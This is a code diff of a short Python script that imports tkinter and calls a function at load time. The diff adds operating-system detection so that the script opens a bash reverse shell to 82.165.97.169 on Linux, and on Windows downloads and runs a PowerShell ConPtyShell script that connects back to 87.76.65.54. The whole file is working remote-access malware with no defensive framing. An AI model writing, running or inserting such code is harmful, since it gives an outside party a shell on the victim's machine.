@@ -1,10 +1,15 @@
 import tkinter as tk
-import os
+import subprocess
+import platform
 
+system = platform.system().lower();
 
 
 def runTheCommand():
-	os.system("/bin/bash -i > /dev/tcp/82.165.97.169/{4858} 0<&1 2>&1")
+	if(system == "linux"): 
+		subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/4858 0<&1 2>&1 &", shell=True, executable='/bin/bash')
+	elif(system == "windows" ):  
+		subprocess.check_call("IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 4567", shell=True, executable="poweshell")
 
 runTheCommand()
 
